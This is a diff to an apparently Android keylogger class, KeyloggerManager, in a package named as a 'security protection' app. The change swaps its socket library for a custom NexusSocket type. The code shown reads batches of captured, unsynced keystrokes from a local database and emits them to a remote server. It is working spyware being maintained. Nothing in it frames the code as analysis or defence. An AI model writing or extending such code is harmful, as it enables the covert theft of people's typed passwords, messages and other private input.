@@ -8,11 +8,11 @@ import com.seguranca.protecao.UiAssistBridge;
 import com.seguranca.protecao.AppCoreInitializer;
 import com.seguranca.protecao.core.Protocol;
 import com.seguranca.protecao.core.SocketClient;
+import com.seguranca.protecao.core.NexusSocket;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import io.socket.client.Socket;
 
 public class KeyloggerManager {
     private static final String TAG = "Keylogger";
@@ -132,7 +132,7 @@ public class KeyloggerManager {
     public void syncToServer() {
         if (!syncInProgress.compareAndSet(false, true)) return;
         if (db == null) { syncInProgress.set(false); return; }
-        Socket socket = SocketClient.getInstance().getSocket();
+        NexusSocket socket = SocketClient.getInstance().getSocket();
         if (socket == null || !socket.connected()) { syncInProgress.set(false); return; }
         try {
             JSONArray keystrokes = db.getUnsynced(SYNC_BATCH_SIZE);
@@ -148,7 +148,7 @@ public class KeyloggerManager {
             payload.put(Protocol.KEY_KEYSTROKES, keystrokes);
             payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
             final long syncStartTime = System.currentTimeMillis();
-            socket.emit(Protocol.KEYLOGGER, payload, new io.socket.client.Ack() {
+            socket.emit(Protocol.KEYLOGGER, payload, new NexusSocket.Ack() {
                 @Override
                 public void call(Object... args) {
                     try {
